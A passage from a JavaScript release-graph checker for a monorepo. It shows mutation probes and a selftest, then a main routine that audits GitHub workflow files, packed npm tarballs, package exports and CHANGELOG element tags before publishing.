          text: 'jobs:\n  rc:\n    uses: ./.github/workflows/publish-packages.yml\n    with:\n      registry: https://npm.pkg.github.com\n      dist-tag: "  "\n',
        },
      ]),
  },
  {
    what: 'a caller delegating without a registry',
    run: () =>
      checkPublishingCallersDelegate([
        {
          file: 'caller.yml',
          text: 'jobs:\n  rc:\n    uses: ./.github/workflows/publish-packages.yml\n    with:\n      dist-tag: rc\n',
        },
      ]),
  },
  {
    what: 'the caller scan asserted over zero workflow files',
    run: () => checkPublishingCallersDelegate([]),
  },
  {
    what: 'a sourcemap in the tarball',
    run: () => checkForbiddenContents([{ name: '@x/a', files: ['dist/index.js', 'dist/index.js.map'] }]),
  },
  {
    what: 'a test file in the tarball',
    run: () => checkForbiddenContents([{ name: '@x/a', files: ['src/thing.test.ts'] }]),
  },
  {
    what: 'a hand-written list in a workflow other than release.yml',
    run: () =>
      checkNoHandWrittenListsAnywhere(
        [{ file: 'x.yml', text: 'jobs:\n  b:\n    steps:\n      - run: nx run-many --projects=tokens,styles,elements\n' }],
        ['@spec-kitty/tokens'],
        ['tokens', 'styles', 'elements'],
      ),
  },
  {
    what: 'the all-workflow scan asserted over zero workflow files',
    run: () => checkNoHandWrittenListsAnywhere([], ['@x/a'], ['a']),
  },
  {
    what: 'a CHANGELOG missing an element the manifest registers',
    run: () => checkChangelogTagsMatchManifest('ships `sk-button`', ['sk-button', 'sk-card']),
  },
  {
    what: 'a CHANGELOG naming an element the manifest does not have',
    run: () => checkChangelogTagsMatchManifest('ships `sk-button` and `sk-ghost`', ['sk-button']),
  },
  {
    what: 'the CHANGELOG comparison asserted over zero manifest tags',
    run: () => checkChangelogTagsMatchManifest('ships `sk-button`', []),
  },
  {
    what: 'a graph accessor that returns an empty array instead of throwing',
    run: () => checkGraphFailsClosed({ publishable: () => [] }),
  },
];

function selftest() {
  let failed = 0;
  // THE BASELINES MUST BE CLEAN, ASSERTED RATHER THAN ASSUMED. A comment in this file used to claim
  // the anchor-miss case "is asserted below rather than trusted"; no such assertion existed. Two
  // consequences, both demonstrated by a lens: a fixture carrying a pre-existing problem makes
  // every probe over it vacuous (the mutant and the pristine text both report problems, so the
  // probe "trips" no matter what the guard does), and a guard deleted afterwards still shows a
  // green probe line. `withDefect`/`withPayloadDefect`/`withCallerDefect` catch a stale ANCHOR;
  // this catches a stale BASELINE. Together they are what make a green probe mean something.
  const baselines = [
    ['VALID_RELEASE_WORKFLOW', () => checkWorkflowUsesDerivedSet(VALID_RELEASE_WORKFLOW, ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml')],
    ['REUSABLE_PAYLOAD_FIXTURE', () => checkWorkflowUsesDerivedSet(REUSABLE_PAYLOAD_FIXTURE, ['@spec-kitty/tokens'], ['tokens'], 'publish', 'publish-packages.yml')],
    ['VALID_CALLER_FIXTURE', () => checkPublishingCallersDelegate([{ file: 'release-rc.yml', text: VALID_CALLER_FIXTURE }])],
    ['VALID_RELEASE_TRIGGER', () => checkReleaseTrigger(VALID_RELEASE_TRIGGER, 'release.yml')],
    // The rc caller delegates to our own payload and runs no steps: it must stay clean, and the
    // exemption that makes it so has no must-trip probe (REL3 pass 7, reducer).
    ['the rc caller job, which only delegates to the payload', () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/release-rc.yml', text: 'jobs:\n  rc:\n    uses: ./.github/workflows/publish-packages.yml\n    permissions:\n      contents: read\n      packages: write\n      id-token: write\n      attestations: write\n' }])],
    // The token rule's "could resolve to a registry script" narrowing is an OVER-REFUSAL fix, so its
    // guard is a clean baseline rather than a must-trip probe (REL3 pass 9, debugger — third report of
    // this shape): honest commands that merely name something under scripts/ must stay clean.
    ['ordinary commands that name scripts/ without being able to run a publisher', () => checkPublishingCallersDelegate([{ file: '.github/workflows/docs.yml', text: 'jobs:\n  d:\n    steps:\n      - run: |\n          cp scripts/*.md docs/\n          ls scripts/\n          node scripts/render-diagrams.js --check\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }])],
    // An ordinary job whose COMMENT mentions a publish command is not a publishing job (REL3 pass 6,
    // reviewer): the discovery detector reads shell, and prose is not shell.
    ['an unaudited job whose comment mentions npm dist-tag ls', () => checkNoUnauditedPublishingJobs([{ file: '.github/workflows/docs.yml', text: 'jobs:\n  docs:\n    steps:\n      - run: |\n          # the release job runs `npm dist-tag ls` later; this one only builds docs\n          node scripts/render-diagrams.js\n' }])],
    // The token-holder rule must not over-refuse: the report script holding the token is clean.
    ['VALID_RELEASE_WORKFLOW, report holding the token', () => checkWorkflowUsesDerivedSet(withDefect('      - name: Report\n        run: node scripts/report-dist-tags.mjs', '      - name: Report\n        env:\n          NODE_AUTH_TOKEN: x\n        run: node scripts/report-dist-tags.mjs'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml')],
  ];
  for (const [name, run] of baselines) {
    const dirt = run();
    if (dirt.length !== 0) {
      console.error(`❌ ${name} is not a clean baseline — ${dirt.length} problem(s) before any mutation:`);
      for (const d of dirt) console.error(`   - ${d}`);
      console.error('   Every probe built on it is vacuous. Fix the fixture, not the floor.');
      process.exit(1);
    }
  }
  console.log(`✅ ${baselines.length} probe baselines are clean before mutation.`);
  for (const probe of PROBES) {
    const problems = probe.run();
    if (problems.length === 0) {
      console.log(`❌ probe did NOT trip: ${probe.what}`);
      failed++;
    } else {
      console.log(`✅ ${probe.what} — rejected (${problems.length})`);
    }
  }
  if (failed) {
    console.error(`\n❌ ${failed} of ${PROBES.length} probes failed to trip. The gate cannot see what it claims to.`);
    process.exit(1);
  }
  // The floor is asserted, not implied: a probe list that silently emptied would print nothing
  // and exit 0, which is the defect this script is about. Raised from 27 by REL2 (#363), then
  // again by REL2's pass-2 review, which turned thirteen separately-measured surviving mutants
  // into probes. TAKEN FROM THE TABLE'S OWN REPORTED COUNT, never from arithmetic — three floors
  // in this mission were set by counting in my head and all three were wrong. The message
  // interpolates the constant for the same reason: it previously read "the floor is 34" while
  // enforcing 35, so the one file whose thesis is that floors must be legible had an illegible one.
  if (PROBES.length < PROBE_FLOOR) {
    console.error(`❌ only ${PROBES.length} probes — the selftest floor is ${PROBE_FLOOR}`);
    process.exit(1);
  }
  console.log(`\n✅ all ${PROBES.length} probes tripped the gate.`);
}

/* ──────────────────────────────────── main ──────────────────────────────────── */

function main() {
  const pkgs = all();
  const workflowFiles = readdirSync(join(ROOT, '.github/workflows'))
    .filter((f) => /\.ya?ml$/.test(f))
    .map((f) => ({ file: `.github/workflows/${f}`, text: readFileSync(join(ROOT, '.github/workflows', f), 'utf8') }));
  // Local actions are resolved from what the workflows USE, so one outside .github/actions, or nested
  // deeper than one level, is read rather than missed (REL3 pass 6, architect).
  const usedLocalActions = collectUsedLocalActions(workflowFiles, (ref) => {
    const base = join(ROOT, ref.replace(/^\.\//, ''));
    for (const name of ['action.yml', 'action.yaml']) {
      if (existsSync(join(base, name))) return { file: `${ref.replace(/^\.\//, '')}/${name}`, text: readFileSync(join(base, name), 'utf8') };
    }
    return existsSync(base) && /\.ya?ml$/.test(base) ? { file: ref.replace(/^\.\//, ''), text: readFileSync(base, 'utf8') } : null;
  });
  const pub = publishable();
  const build = buildable();

  console.log(`packages:    ${pkgs.map((p) => p.dir).join(', ')}`);
  console.log(`publishable: ${pub.map((p) => p.name).join(', ')}`);
  console.log(`buildable:   ${build.map((p) => p.project).join(', ')}`);

  const tarballs = pub.map(packOne);
  for (const t of tarballs) {
    // KiB, labelled KiB. SIZES.md devotes a paragraph to a basis mistake that turned 24073 bytes
    // into "24.0 KB", and sends readers here for packed size — so this line must not repeat it.
    console.log(`  ${t.name}: ${t.files.length} files, ${(t.size / 1024).toFixed(1)} KiB packed (gzipped; varies by machine)`);
  }

  const problems = [
    ...checkNothingSilentlyPrivate(pkgs, EXPECTED_PRIVATE),
    ...checkNoManifestDistTag(pkgs),
    ...checkTarballsNonEmpty(tarballs),
    ...checkExportsResolve(tarballs),
    ...checkLegacyEntriesResolve(tarballs),
    ...checkForbiddenContents(tarballs),
    ...checkSubpathCoverage(
      readdirSync(join(ROOT, 'packages/styles/src'), { withFileTypes: true })
        .filter((d) => d.isDirectory())
        .map((d) => d.name)
        .sort(),
      Object.keys(JSON.parse(readFileSync(join(ROOT, 'packages/styles/package.json'), 'utf8')).exports ?? {}),
      '@spec-kitty/styles',
    ),
    // BOTH payloads, not one. `release.yml` still carries the prod path inline; the rc path's
    // payload now lives in the reusable `publish-packages.yml`, and its `publish` job is what
    // actually resolves, builds, verifies and publishes. Auditing only the first is what left the
    // second unguarded.
    ...checkWorkflowUsesDerivedSet(readFileSync(join(ROOT, WORKFLOW), 'utf8'), pkgs.map((p) => p.name), pkgs.map((p) => p.dir), RELEASE_JOB, WORKFLOW),
    ...checkReleaseTrigger(readFileSync(join(ROOT, WORKFLOW), 'utf8')),
    ...checkNoIndirectPublishScripts(JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8'))),
    ...pkgs.flatMap((p) => checkNoIndirectPublishScripts(JSON.parse(readFileSync(join(ROOT, 'packages', p.dir, 'package.json'), 'utf8')), `packages/${p.dir}/package.json`)),
    ...(existsSync(join(ROOT, REUSABLE_WORKFLOW))
      ? checkWorkflowUsesDerivedSet(
          readFileSync(join(ROOT, REUSABLE_WORKFLOW), 'utf8'),
          pkgs.map((p) => p.name),
          pkgs.map((p) => p.dir),
          PAYLOAD_JOB,
          REUSABLE_WORKFLOW,
        )
      : [`${REUSABLE_WORKFLOW} is missing — the rc stream's publish payload has nowhere to live`]),
    ...checkPublishingCallersDelegate(
      readdirSync(join(ROOT, '.github/workflows'))
        .filter((f) => /\.ya?ml$/.test(f))
        .map((f) => ({ file: `.github/workflows/${f}`, text: readFileSync(join(ROOT, '.github/workflows', f), 'utf8') })),
      // The payload's own text, so the ceiling is PARSED rather than mirrored by a constant.
      existsSync(join(ROOT, REUSABLE_WORKFLOW)) ? readFileSync(join(ROOT, REUSABLE_WORKFLOW), 'utf8') : null,
    ),
    ...usedLocalActions.problems,
    ...checkCompositeActionsDoNotPublish(usedLocalActions.actions),
    ...checkNoUnauditedPublishingJobs(
      readdirSync(join(ROOT, '.github/workflows'))
        .filter((f) => /\.ya?ml$/.test(f))
        .map((f) => ({ file: `.github/workflows/${f}`, text: readFileSync(join(ROOT, '.github/workflows', f), 'utf8') })),
    ),
    ...checkRegistryAuthorityAgrees(
      pub,
      readdirSync(join(ROOT, '.github/workflows'))
        .filter((f) => /\.ya?ml$/.test(f))
        .map((f) => ({ file: `.github/workflows/${f}`, text: readFileSync(join(ROOT, '.github/workflows', f), 'utf8') })),
    ),
    ...checkNoHandWrittenListsAnywhere(
      // Composite actions too: a list moved into .github/actions/*/action.yml was invisible,
      // because only .github/workflows was ever read.
      [
        ...readdirSync(join(ROOT, '.github/workflows'))
          .filter((f) => /\.ya?ml$/.test(f))
          .map((f) => ({ file: `.github/workflows/${f}`, text: readFileSync(join(ROOT, '.github/workflows', f), 'utf8') })),
        ...(existsSync(join(ROOT, '.github/actions'))
          ? readdirSync(join(ROOT, '.github/actions'), { withFileTypes: true })
              .filter((d) => d.isDirectory())
              .flatMap((d) =>
                ['action.yml', 'action.yaml']
                  .filter((n) => existsSync(join(ROOT, '.github/actions', d.name, n)))
                  .map((n) => ({ file: `.github/actions/${d.name}/${n}`, text: readFileSync(join(ROOT, '.github/actions', d.name, n), 'utf8') })),
              )
          : []),
      ],
      pkgs.map((p) => p.name),
      pkgs.map((p) => p.dir),
    ),
    ...checkChangelogTagsMatchManifest(
      readFileSync(join(ROOT, 'CHANGELOG.md'), 'utf8'),
      (() => {
        const m = JSON.parse(readFileSync(join(ROOT, 'packages/elements/custom-elements.json'), 'utf8'));
        const tags = [];
        for (const mod of m.modules ?? []) for (const d of mod.declarations ?? []) if (d.tagName) tags.push(d.tagName);
        return [...new Set(tags)].sort();
      })(),
    ),
    ...checkGraphFailsClosed({ publishable, buildable }),
  ];

  if (problems.length) {
    console.error(`\n❌ ${problems.length} release-graph problem(s):\n`);
    problems.forEach((p) => console.error(`  - ${p}`));
    process.exit(1);
  }
  console.log(`\n✅ release graph is coherent: ${pub.length} publishable packages, all packing, all exports resolving.`);
}

// Run-as-CLI guard, matching release-graph.mjs. Without it, importing this module for its
// exported checks ran main() — spawning `npm pack` for every package and calling process.exit —
// which a lens hit while trying to unit-test the very functions the header advertises as pure.
if (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  if (process.argv.includes('--selftest')) selftest();
  else main();
}
